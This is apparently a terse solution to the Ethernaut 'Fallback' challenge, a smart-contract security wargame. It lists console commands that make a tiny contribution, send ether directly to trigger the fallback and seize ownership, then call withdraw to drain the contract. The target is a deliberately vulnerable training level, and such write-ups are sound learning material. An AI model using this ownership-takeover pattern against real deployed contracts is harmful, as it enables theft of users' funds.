https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB

```console
toWei("0.0001")
> '100000000000000'

await contract.contribute({value:100000000000000})
await contract.sendTransaction({value:1})

await contract.owner() // owener is already changed
await contract.withdraw()
```
